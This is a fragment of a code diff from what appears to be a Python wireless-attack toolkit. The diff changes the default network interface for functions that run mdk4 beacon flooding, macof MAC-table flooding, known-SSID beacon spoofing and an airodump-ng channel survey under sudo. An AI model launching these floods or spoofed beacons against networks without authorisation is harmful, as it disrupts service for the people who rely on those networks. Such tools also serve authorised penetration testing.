+        interface = interface or self._default_iface()
         mdk = _which("mdk4")
         if mdk:
             cmd = ["sudo", mdk, interface, "b"]
@@ -2203,7 +2434,8 @@ while True:
             UI.print_error("mdk4 required")
 
     # ── MAC Flooding ──────────────────────────────────────────
-    def do_mac_flood(self, interface: str = "wlan0", count: int = 5000, rate: int = 100, **kwargs):
+    def do_mac_flood(self, interface: Optional[str] = None, count: int = 5000, rate: int = 100, **kwargs):
+        interface = interface or self._default_iface()
         if _which("macof"):
             cmd = ["sudo", "macof", "-i", interface, "-n", str(count), "-s", str(rate)]
             self.jobs.start("mac-flood", subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
@@ -2212,7 +2444,8 @@ while True:
             UI.print_error("macof (dsniff) required")
 
     # ── Known Beacon SSID ─────────────────────────────────────
-    def do_known_beacon(self, interface: str = "wlan0", list: str = "enterprise", channel: int = 6, **kwargs):
+    def do_known_beacon(self, interface: Optional[str] = None, list: str = "enterprise", channel: int = 6, **kwargs):
+        interface = interface or self._default_iface()
         mdk = _which("mdk4")
         if mdk:
             cmd = ["sudo", mdk, interface, "b", "-c", str(channel)]
@@ -2222,7 +2455,8 @@ while True:
             UI.print_error("mdk4 required")
 
     # ── Channel Survey ────────────────────────────────────────
-    def do_channel_survey(self, interface: str = "wlan0", **kwargs):
+    def do_channel_survey(self, interface: Optional[str] = None, **kwargs):
+        interface = interface or self._default_iface()
         UI.print_info(f"Channel survey on {interface}")
         proc = subprocess.Popen(["sudo", "airodump-ng", "--band", "abg", interface, "--write", "/tmp/hackit_survey", "--output-format", "csv"],
                                  stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
